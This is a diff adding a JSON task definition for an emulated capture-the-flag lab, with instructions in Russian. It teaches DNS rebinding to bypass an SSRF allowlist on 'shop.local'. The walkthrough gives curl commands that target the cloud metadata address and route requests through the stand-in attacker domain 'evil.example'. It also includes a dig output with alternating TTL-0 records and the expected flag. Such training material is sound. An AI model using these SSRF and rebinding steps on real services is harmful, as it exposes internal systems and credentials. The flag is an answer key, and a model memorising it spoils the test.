@@ -1,0 +1,27 @@
+{
+  "id": "web-dns-rebinding",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{dns_r3b1nd_t0ct0u_byp4ss}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: DNS rebinding против SSRF-allowlist\n\n`shop.local/tools/fetch` резолвит хост и блокирует приватные адреса. Прямой\nIP отсекается. Но домен `evil.example` (наш) чередует ответы с TTL=0.\n\n1. Убедись, что прямой внутренний адрес блокируется:\n\n   curl -s 'https://shop.local/tools/fetch' -d 'url=http://169.254.169.254/'\n\n2. Посмотри, как отвечает наш DNS (два A-записи, TTL 0):\n\n   dig evil.example A\n\n3. Повторяй запрос: рано или поздно «проверка» и «запрос» попадут на разные\n   ответы, и сервер обратится к внутренней админке:\n\n   curl -s 'https://shop.local/tools/fetch' -d 'url=http://evil.example/admin' | grep nto > found.txt\n\n4. Набери `check`.\n" }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция SSRF-ручки shop.local)",
+      "cases": [
+        { "match": "evil\\.example", "example": "-s 'https://shop.local/tools/fetch' -d 'url=http://evil.example/admin'", "output": "{\"error\":\"blocked: private address\"}\n{\"error\":\"not an image\"}\n{\"preview\":\"<html><title>Internal Admin</title>\\nnto{dns_r3b1nd_t0ct0u_byp4ss}\"}\n" },
+        { "match": "169\\.254\\.169\\.254", "example": "-s 'https://shop.local/tools/fetch' -d 'url=http://169.254.169.254/'", "output": "{\"error\":\"blocked: private address\"}\n" }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только SSRF-ручка /tools/fetch на shop.local.\n"
+    },
+    "dig": {
+      "help": "dig <имя> [A] — DNS-запрос (эмуляция чередующегося домена)",
+      "cases": [
+        { "match": "evil\\.example", "example": "evil.example A", "output": "\n;; ANSWER SECTION:\nevil.example.\t0\tIN\tA\t203.0.113.10\nevil.example.\t0\tIN\tA\t127.0.0.1\n" }
+      ],
+      "fallback": "dig: в этой лабе эмулируется только evil.example.\n"
+    }
+  }
+}
